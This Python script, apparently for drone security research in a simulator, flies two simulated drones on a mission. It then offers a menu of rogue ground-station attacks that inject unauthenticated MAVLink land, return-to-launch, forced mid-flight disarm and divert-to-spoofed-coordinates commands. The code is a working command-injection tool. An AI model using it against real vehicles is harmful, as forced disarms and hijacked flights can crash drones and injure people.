#!/usr/bin/env python3
"""
Rogue GCS Attack Simulation
----------------------------
Scenario:
  1. Leader drone loads a waypoint mission and flies autonomously (AUTO mode).
  2. Follower drone mirrors the leader's position in real time (GUIDED mode).
  3. Mid-mission, a compromised/rogue GCS injects a LAND command,
     forcing both drones to land — interrupting the active mission.

For SITL security research only.
"""

from pymavlink import mavutil
import time
import threading

# ── config ───────────────────────────────────────────────────────────────────

LEADER_URI   = "udp:127.0.0.1:14551"
FOLLOWER_URI = "udp:127.0.0.1:14561"
LEADER_SYSID   = 1
FOLLOWER_SYSID = 2

WPL_FILE   = "../missions/drone1.wpl"
TAKEOFF_ALT = 30  # metres, must match WPL altitude


# ── connection ───────────────────────────────────────────────────────────────

def connect(uri, name):
    print(f"[+] Connecting to {name} @ {uri}")
    c = mavutil.mavlink_connection(uri)
    c.wait_heartbeat()
    print(f"[+] Heartbeat from {name}")
    return c


# ── mode / arm helpers ───────────────────────────────────────────────────────

def set_mode(conn, sysid, mode_str):
    mode_id = conn.mode_mapping()[mode_str]
    conn.mav.set_mode_send(
        sysid,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        mode_id
    )
    time.sleep(0.5)


def arm(conn, sysid, name):
    print(f"[*] Arming {name}...")
    set_mode(conn, sysid, "GUIDED")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0, 1, 0, 0, 0, 0, 0, 0
    )
    for _ in range(30):
        msg = conn.recv_match(type="HEARTBEAT", blocking=True, timeout=1)
        if msg and (msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED):
            print(f"[+] {name} armed.")
            return True
        time.sleep(0.5)
    print(f"[-] {name} failed to arm. Check ARMING_CHECK param (set to 0 in SITL if needed).")
    return False


def takeoff(conn, sysid, name, alt):
    print(f"[*] Takeoff {name} -> {alt}m")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
        0, 0, 0, 0, 0, 0, 0, alt
    )


# ── waypoint upload ──────────────────────────────────────────────────────────

def parse_wpl(path):
    """Parse a QGC WPL 110 file, return list of MAVLink waypoint objects."""
    waypoints = []
    with open(path) as f:
        lines = f.readlines()
    assert lines[0].strip().startswith("QGC WPL"), "Not a valid QGC WPL file."
    for line in lines[1:]:
        line = line.strip()
        if not line:
            continue
        parts = line.split()
        if len(parts) < 12:
            continue
        seq      = int(parts[0])
        current  = int(parts[1])
        frame    = int(parts[2])
        command  = int(parts[3])
        p1, p2, p3, p4 = float(parts[4]), float(parts[5]), float(parts[6]), float(parts[7])
        x, y, z  = float(parts[8]), float(parts[9]), float(parts[10])
        autocont = int(parts[11])
        waypoints.append((seq, current, frame, command, p1, p2, p3, p4, x, y, z, autocont))
    return waypoints


def upload_mission(conn, sysid, waypoints):
    print(f"[*] Uploading {len(waypoints)} waypoints to sysid={sysid}...")

    # re-index to guarantee 0,1,2,... regardless of WPL sequence numbers
    indexed = []
    for i, (_, current, frame, command, p1, p2, p3, p4, x, y, z, autocont) in enumerate(waypoints):
        indexed.append((i, current, frame, command, p1, p2, p3, p4, x, y, z, autocont))

    conn.mav.mission_count_send(sysid, 0, len(indexed))

    sent = 0
    while sent < len(indexed):
        msg = conn.recv_match(type=["MISSION_REQUEST", "MISSION_REQUEST_INT"],
                              blocking=True, timeout=5)
        if not msg:
            print(f"[-] No MISSION_REQUEST received (sent {sent}/{len(indexed)})")
            return False

        req_seq = msg.seq
        if req_seq >= len(indexed):
            print(f"[-] Vehicle requested out-of-range seq {req_seq}")
            return False

        seq, current, frame, command, p1, p2, p3, p4, x, y, z, autocont = indexed[req_seq]
        conn.mav.mission_item_int_send(
            sysid, 0,
            seq, frame, command,
            current, autocont,
            p1, p2, p3, p4,
            int(x * 1e7), int(y * 1e7), z
        )
        sent += 1

    ack = conn.recv_match(type="MISSION_ACK", blocking=True, timeout=5)
    if ack and ack.type == mavutil.mavlink.MAV_MISSION_ACCEPTED:
        print("[+] Mission upload accepted.")
        return True
    print(f"[-] Mission upload failed. ACK: {ack}")
    return False


def start_mission(conn, sysid):
    print("[*] Starting AUTO mission on leader...")
    set_mode(conn, sysid, "AUTO")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_MISSION_START,
        0, 0, 0, 0, 0, 0, 0, 0
    )


# ── follower position mirror ─────────────────────────────────────────────────

def mirror_position(leader_conn, follower_conn, follower_sysid, stop_event):
    print("[*] Follower mirror thread running...")
    while not stop_event.is_set():
        msg = leader_conn.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=1)
        if not msg:
            continue
        lat = msg.lat / 1e7
        lon = msg.lon / 1e7
        alt = msg.relative_alt / 1000.0  # mm -> m
        if alt < 1.0:
            continue
        follower_conn.mav.send(mavutil.mavlink.MAVLink_set_position_target_global_int_message(
            0,
            follower_sysid, 0,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            0b0000111111111000,
            int(lat * 1e7), int(lon * 1e7), alt,
            0, 0, 0,
            0, 0, 0,
            0, 0
        ))
        time.sleep(0.2)


# ── rogue commands ───────────────────────────────────────────────────────────

def rogue_land(conn, sysid, name):
    print(f"[!!!] ROGUE LAND injected -> {name}")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_NAV_LAND,
        0, 0, 0, 0, 0, 0, 0, 0
    )


def rogue_rtl(conn, sysid, name):
    print(f"[!!!] ROGUE RTL injected -> {name}")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
        0, 0, 0, 0, 0, 0, 0, 0
    )


def rogue_disarm(conn, sysid, name):
    print(f"[!!!] ROGUE DISARM injected -> {name}")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0, 0, 21196, 0, 0, 0, 0, 0
    )


# spoof target coords — somewhere ~500m away from the default SITL home
ROGUE_LAT =  -35.3600
ROGUE_LON =  149.1700
ROGUE_ALT =  30.0  # metres AGL

def rogue_goto(conn, sysid, name):
    print(f"[!!!] ROGUE GOTO injected -> {name}  ({ROGUE_LAT}, {ROGUE_LON}, {ROGUE_ALT}m)")
    # switch to GUIDED so the vehicle accepts the position target
    set_mode(conn, sysid, "GUIDED")
    conn.mav.send(mavutil.mavlink.MAVLink_set_position_target_global_int_message(
        0,
        sysid, 0,
        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
        0b0000111111111000,          # position only
        int(ROGUE_LAT * 1e7),
        int(ROGUE_LON * 1e7),
        ROGUE_ALT,
        0, 0, 0,
        0, 0, 0,
        0, 0
    ))


ATTACKS = {
    "1": ("LAND (mid-mission)",              rogue_land),
    "2": ("RTL  (mid-mission)",              rogue_rtl),
    "3": ("DISARM (mid-flight)",             rogue_disarm),
    "4": ("GOTO  (divert to rogue coords)",  rogue_goto),
}


# ── main ─────────────────────────────────────────────────────────────────────

def main():
    leader   = connect(LEADER_URI,   "LEADER")
    follower = connect(FOLLOWER_URI, "FOLLOWER")

    # --- phase 1: arm both ---
    if not arm(leader, LEADER_SYSID, "LEADER"):
        return
    if not arm(follower, FOLLOWER_SYSID, "FOLLOWER"):
        return

    # --- phase 2: takeoff follower (GUIDED), upload + start leader mission ---
    takeoff(follower, FOLLOWER_SYSID, "FOLLOWER", TAKEOFF_ALT)

    waypoints = parse_wpl(WPL_FILE)
    if not upload_mission(leader, LEADER_SYSID, waypoints):
        return

    print("[*] Waiting 3s for follower to reach altitude...")
    time.sleep(3)

    start_mission(leader, LEADER_SYSID)

    # --- phase 3: follower mirrors leader in background ---
    stop_event = threading.Event()
    t = threading.Thread(
        target=mirror_position,
        args=(leader, follower, FOLLOWER_SYSID, stop_event),
        daemon=True
    )
    t.start()

    # --- phase 4: rogue GCS attack menu ---
    print("\n" + "="*50)
    print("  !! ROGUE GCS ACTIVE — Mission in progress !!")
    print("="*50)
    print("  Leader is flying AUTO mission.")
    print("  Follower is shadowing leader position.")
    print()
    print("  Inject an attack mid-mission:")
    for k, (label, _) in ATTACKS.items():
        print(f"    {k} -> {label}")
    print(f"    4 -> GOTO (divert both to {ROGUE_LAT}, {ROGUE_LON})")
    print("    q -> quit (drones keep flying)")
    print("="*50 + "\n")

    while True:
        choice = input("Attack: ").strip().lower()
        if choice == "q":
            stop_event.set()
            print("[*] Exiting. Drones continue on their own.")
            break
        if choice in ATTACKS:
            label, fn = ATTACKS[choice]
            print(f"\n[!!!] ATTACK: {label}")
            fn(leader,   LEADER_SYSID,   "LEADER")
            time.sleep(0.1)
            fn(follower, FOLLOWER_SYSID, "FOLLOWER")
            print(f"[*] Both drones compromised.\n")
        else:
            print("Unknown input. Use 1, 2, 3, or q.")


if __name__ == "__main__":
    main()
